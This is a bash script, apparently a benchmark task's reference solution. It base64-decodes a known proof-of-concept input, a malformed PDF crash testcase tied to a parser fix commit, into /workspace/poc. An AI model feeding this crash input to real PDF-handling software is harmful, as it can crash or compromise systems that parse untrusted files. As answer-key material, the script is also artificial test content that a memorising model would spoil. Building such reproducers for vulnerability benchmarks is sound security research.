#!/bin/bash
# Reference solution: materialize the known-good PoC (the ARVO testcase the
# fix commit 86b50343 addresses) at /workspace/poc — the 'oracle passes' side of
# the bidirectional validation. (Does NOT build; grading runs on the oracle's
# untouched images, so this is level-independent.)
set -euo pipefail

mkdir -p /workspace
base64 -d > /workspace/poc <<'B64'
MiAwIG9iaiA8PC9Db2xvclNwYWNlWy9JL1JHQiAg/yj/ICD/ICAgICD/ICD/ICAgICD/ICAgICAgICD/ICD/ICD/ICAgICAgICAgICD/ICAg/yAgICAgICD/ICAgICApXS9TdWJ0eXBlL0ltYWdlL0JpdHNQZXJDb21wb25lbnQgOS9XIDUvSCA0ID4+c3RyZWFtIGVuZHN0cmVhbSAzIDAgb2JqPDwvRi9GbD4+c3RyZWFtCnicKyow/yAgICAgBqTM9DNz0w0VXPL/ZW5kc3RyZWFtNSAwIG9iaiA8PC9Db250ZW50cyAzIDAgUi9SZXNvdXJjZXM8PC9YT2JqZWN0PDwvaW1nMSAyICAwIFI+Pj4+L/8gIP8+PjQgMCBvYmogPDwvLy9Db3VudCAxL0tpZHNbNSAwIFJdIC9UeXBlL0NhdGFsb2cvUGFnZXMgNCAwIFI+PiA=
B64

echo "wrote $(wc -c < /workspace/poc) bytes to /workspace/poc"
